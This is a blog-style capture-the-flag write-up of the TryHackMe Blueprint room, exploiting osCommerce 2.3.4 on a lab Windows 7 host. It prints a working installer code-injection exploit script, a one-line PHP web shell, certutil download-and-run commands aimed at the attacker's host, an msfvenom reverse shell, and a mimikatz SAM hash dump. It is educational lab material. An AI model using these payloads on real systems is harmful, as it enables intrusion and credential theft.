---
layout: single
title: TryHackMe - Blueprint
excerpt: Hack into this Windows machine and escalate your privileges to Administrator. Do you have what it takes to break in and fully compromise the system? Your objective is to explore the environment, uncover hidden weaknesses, and leverage them to gain elevated access. Along the way, you’ll need to locate and decrypt the NTLM hash belonging to the “Lab” user, which serves as a critical step in proving your foothold. Finally, track down the root.txt file to complete the capture the flag challenge and demonstrate full control of the machine.
date: 2025-11-10
classes: wide
header:
  teaser: /assets/images/thm-blueprint/logo.png
  teaser_home_page: true
categories:
  - TryHackMe
  - Easy
  - Windows
tags:
  - oscommerce-2.3.4-rce
  - file-upload-abuse
---

# Introduction
-------------
This writeup documents the penetration testing of the [**Blueprint**](https://tryhackme.com/room/blueprint) machine from the [**TryHackMe**](https://tryhackme.com/) platform.

In this ocasion, I'll exploit a vulnerable e-commerce platform called osEcommerce through a LFI vulnerability.

<br>
# Information Gathering
------------------

Once we have discovered the IP of the machine we need to enumerate as much information as possible.

When we ping a machine that is in our local network, normally:
* TTL 64: Linux machine.
* TTL 128: Windows machine.
We can also use the [**whichSystem**](https://github.com/Akronox/WichSystem.py) script.

```java
❯ ping -c 1 10.10.91.114
PING 10.10.91.114 (10.10.91.114) 56(84) bytes of data.
64 bytes from 10.10.91.114: icmp_seq=1 ttl=127 time=218 ms

--- 10.10.91.114 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 218.135/218.135/218.135/0.000 ms
```

In this case, the target seems to be a Windows machine. Let's perform a port scan with nmap.

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.91.114 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 21:02 CET
Initiating SYN Stealth Scan at 21:02
Scanning 10.10.91.114 [65535 ports]
Discovered open port 443/tcp on 10.10.91.114
Discovered open port 3306/tcp on 10.10.91.114
Discovered open port 135/tcp on 10.10.91.114
Discovered open port 139/tcp on 10.10.91.114
Discovered open port 445/tcp on 10.10.91.114
Discovered open port 80/tcp on 10.10.91.114
Discovered open port 8080/tcp on 10.10.91.114
Discovered open port 49160/tcp on 10.10.91.114
Discovered open port 49160/tcp on 10.10.91.114
Discovered open port 49153/tcp on 10.10.91.114
Discovered open port 49153/tcp on 10.10.91.114
Discovered open port 49158/tcp on 10.10.91.114
Discovered open port 49158/tcp on 10.10.91.114
Discovered open port 49154/tcp on 10.10.91.114
Discovered open port 49159/tcp on 10.10.91.114
Discovered open port 49152/tcp on 10.10.91.114
Completed SYN Stealth Scan at 21:03, 49.04s elapsed (65535 total ports)
Nmap scan report for 10.10.91.114
Host is up, received user-set (0.12s latency).
Scanned at 2025-11-10 21:02:38 CET for 49s
Not shown: 46479 filtered tcp ports (no-response), 19043 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
443/tcp   open  https        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
3306/tcp  open  mysql        syn-ack ttl 127
8080/tcp  open  http-proxy   syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49158/tcp open  unknown      syn-ack ttl 127
49159/tcp open  unknown      syn-ack ttl 127
49160/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 49.15 seconds
           Raw packets sent: 242563 (10.673MB) | Rcvd: 20178 (807.192KB)
```

Let's perform a deeper scan with the parameter ``-sCV`` over those ports.

```java
❯ nmap -sCV -p80,135,139,443,445,3306,8080,49152,49153,49154,49158,49159,49160 10.10.91.114 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 21:04 CET
Nmap scan report for 10.10.91.114
Host is up (0.16s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: 404 - File or directory not found.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Bad request!
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 1s, median: -2s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-10T20:05:20
|_  start_date: 2025-11-10T19:55:26
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-11-10T20:05:19+00:00
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:b0:1f:aa:21:2f (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.95 seconds
```

Nmap found some open ports, and we can determinate some things:

- It's a Windows 7 Home Basic machine named BLUEPRINT and it's in a workgroup.
- 3 web servers, port 445 and 139 open...

```
❯ whatweb http://10.10.91.114
http://10.10.91.114 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.91.114], Microsoft-IIS[7.5], Title[404 - File or directory not found.]
```

![](/assets/images/thm-blueprint/web1.png)

Nothing interesting in the web, source code or directory and file fuzzing.

Let's enumerate now the port 443.

```
❯ whatweb https://10.10.91.114
https://10.10.91.114 [200 OK] Apache[2.4.23], Country[RESERVED][ZZ], HTTPServer[Windows (32 bit)][Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28], IP[10.10.91.114], Index-Of, OpenSSL[1.0.2h], PHP[5.6.28], Title[Index of /]
```

![](/assets/images/thm-blueprint/web3.png)

Nothing interesting too.

Now, let's enumerate the port 8080.

```
http://10.10.91.114:8080 [200 OK] Apache[2.4.23], Country[RESERVED][ZZ], HTTPServer[Windows (32 bit)][Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28], IP[10.10.91.114], Index-Of, OpenSSL[1.0.2h], PHP[5.6.28], Title[Index of /]
```

![](/assets/images/thm-blueprint/web2.png)

This web server is running **oscommerce-2.3.4** as nmap specified before. This is way too specific. Let's fuzz some directories and files with **Gobuster**.

> osCommerce is a free, open-source e-commerce platform that provides tools for creating and managing online stores. The platform is built on PHP and MySQL.

```python
❯ gobuster dir -u http://10.10.91.114:8080/oscommerce-2.3.4/catalog/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 20 -x txt,php,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.91.114:8080/oscommerce-2.3.4/catalog/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 370] [--> http://10.10.91.114:8080/oscommerce-2.3.4/catalog/images/]
/download             (Status: 401) [Size: 1320]
/download.php         (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 15612]
/privacy.php          (Status: 200) [Size: 11293]
/login.php            (Status: 200) [Size: 13387]
/pub                  (Status: 301) [Size: 367] [--> http://10.10.91.114:8080/oscommerce-2.3.4/catalog/pub/]
/reviews.php          (Status: 200) [Size: 12278]
/Images               (Status: 301) [Size: 370] [--> http://10.10.91.114:8080/oscommerce-2.3.4/catalog/Images/]
/admin                (Status: 301) [Size: 369] [--> http://10.10.91.114:8080/oscommerce-2.3.4/catalog/admin/]
/contact_us.php       (Status: 200) [Size: 12004]
/account.php          (Status: 302) [Size: 0] [--> http://localhost:8080/oscommerce-2.3.4/catalog/login.php?osCsid=4vgn7qb63qenj2do853b35i8o2]
/redirect.php         (Status: 302) [Size: 0] [--> http://localhost:8080/oscommerce-2.3.4/catalog/index.php?osCsid=ntcq4mfl9uqrpdqr0fk5ghhf15]
/specials.php         (Status: 200) [Size: 13437]
/includes             (Status: 301) [Size: 372] [--> http://10.10.91.114:8080/oscommerce-2.3.4/catalog/includes/]
/Privacy.php          (Status: 200) [Size: 11381]
/Index.php            (Status: 200) [Size: 15634]
/install              (Status: 301) [Size: 371] [--> http://10.10.91.114:8080/oscommerce-2.3.4/catalog/install/]
/Download             (Status: 401) [Size: 1320]
/Login.php            (Status: 200) [Size: 13380]
/Download.php         (Status: 200) [Size: 0]
/advanced_search.php  (Status: 200) [Size: 18785]
/product_info.php     (Status: 302) [Size: 0] [--> http://localhost:8080/oscommerce-2.3.4/catalog/index.php?osCsid=cj1tp194mkvr3bd714k9iu4fp5]
/Reviews.php          (Status: 200) [Size: 12256]
/shopping_cart.php    (Status: 200) [Size: 11330]
/shipping.php         (Status: 200) [Size: 11461]
/ext                  (Status: 301) [Size: 367] [--> http://10.10.91.114:8080/oscommerce-2.3.4/catalog/ext/]
/conditions.php       (Status: 200) [Size: 11359]
/INSTALL              (Status: 301) [Size: 371] [--> http://10.10.91.114:8080/oscommerce-2.3.4/catalog/INSTALL/]
/Contact_Us.php       (Status: 200) [Size: 12039]
/IMAGES               (Status: 301) [Size: 370] [--> http://10.10.91.114:8080/oscommerce-2.3.4/catalog/IMAGES/]
/checkout_shipping.php (Status: 302) [Size: 0] [--> http://localhost:8080/oscommerce-2.3.4/catalog/login.php?osCsid=17pi6s1kmthd13i7hasb5csq74]
/INDEX.php            (Status: 200) [Size: 15636]
/Account.php          (Status: 302) [Size: 0] [--> http://localhost:8080/oscommerce-2.3.4/catalog/login.php?osCsid=rprp65ql86tob3arhigjv0kg86]
/Admin                (Status: 301) [Size: 369] [--> http://10.10.91.114:8080/oscommerce-2.3.4/catalog/Admin/]
/create_account.php   (Status: 200) [Size: 29261]
/products_new.php     (Status: 200) [Size: 22586]
/Redirect.php         (Status: 302) [Size: 0] [--> http://localhost:8080/oscommerce-2.3.4/catalog/index.php?osCsid=i0fos6in18fav3ke71k3idupe1]
/*checkout*           (Status: 403) [Size: 1045]
/*checkout*.txt       (Status: 403) [Size: 1045]
/*checkout*.php       (Status: 403) [Size: 1045]
/*checkout*.html      (Status: 403) [Size: 1045]
/SPECIALS.php         (Status: 200) [Size: 13494]
/Install              (Status: 301) [Size: 371] [--> http://10.10.91.114:8080/oscommerce-2.3.4/catalog/Install/]
/product_reviews.php  (Status: 302) [Size: 0] [--> http://localhost:8080/oscommerce-2.3.4/catalog/reviews.php?osCsid=88nnj80v73qskcida9adco7jn2]
/Specials.php         (Status: 200) [Size: 13459]
...
```

<br>
# Vulnerability Assessment
-------

```java
❯ searchsploit oscommerce 2.3.4
-------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities                                           | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                                         | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                                      | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                       | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                          | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                                            | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                                            | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)                                        | php/webapps/50128.py
--------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

I'll be testing this script: ``php/webapps/44374.py``

```bash
# If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible
# for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page
# is already installed and does not attempt to do any authentication. It is possible for an attacker to directly
# execute the "install_4.php" script, which will create the config file for the installation. It is possible to inject
# PHP code into the config file and then simply executing the code by opening it.
```

Gobuster reported the ``install/`` directory, so we're fine with that.

<br>
# Exploitation
------

Now I'll create a maicious php file named ``shell.php`` with this code.

```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

Don't forget to edit the python script:

```python
import requests

# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
base_url = "http://10.10.91.114:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.91.114:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

# the payload will be injected into the configuration file via this code
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
# so the format for the exploit will be: '); PAYLOAD; /*

payload = '\');'
# our php payload
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.8.78.182:8080/shell.php shell.php & nslookup test 10.8.78.182 ");'
payload += 'echo $var;'
payload += '/*'

data['DB_DATABASE'] = payload

# exploit it
r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")
```

Then, I'll start a python web server on the port 8080 and run the exploit.

```python
❯ python3 -m http.server 8080
❯ python 44374.py
[+] Successfully launched the exploit. Open the following URL to execute your code

http://10.10.91.114:8080/oscommerce-2.3.4/catalog/install/includes/configure.php
```

I'll run ``configure.php`` and then run ``shell.php`` with the *cmd* parameter to test if the everything is OK.

![](/assets/images/thm-blueprint/includes.png)

![](/assets/images/thm-blueprint/whoami.png)

<br>
# Post-Exploitation
-------

We need to get an interactive shell session. I'll use ``msfvenom``.

```
❯ msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.8.78.182 LPORT=4444 -f exe -o rev.exe
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe
```

Then, I'll change the path on the python exploit to point the reverse shell binary I created in my machine just a moment ago.

```python
...
# our php payload
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.8.78.182:8080/rev.exe rev.exe & nslookup test 10.8.78.182 ");'
payload += 'echo $var;'
payload += '/*'
...
```

After running the exploit I'll execute ``configure.php`` and the reverse shell binary is uploaded and ready.

![](/assets/images/thm-blueprint/rev.png)

Now, execute ``shell.php?cmd=rev.exe`` while you're listening on the selected port to get the reverse shell.

```powershell
❯ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.78.182] from (UNKNOWN) [10.10.91.114] 49513
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>whoami
whoami
nt authority\system
```

We need to find all the flags. The root flag is in Administrator's desktop.

```powershell
C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
***REDACTED***
```

And finally, let's find the "Lab" user NTLM hash. It's a 32 bits Windows machine, so I'll downlad mimikatz for that arquitecture and then download it from the machine, execute it and dump it.

```
systeminfo
certutil.exe -urlcache -f http://10.8.78.182:8080/mimikatz.exe mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x86) #18362 Feb 29 2020 11:13:10
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # lsadump::sam
...
RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: ***REDACTED***
```

To crack the hash you can use any online tool.

![](/assets/images/thm-blueprint/hash.png)

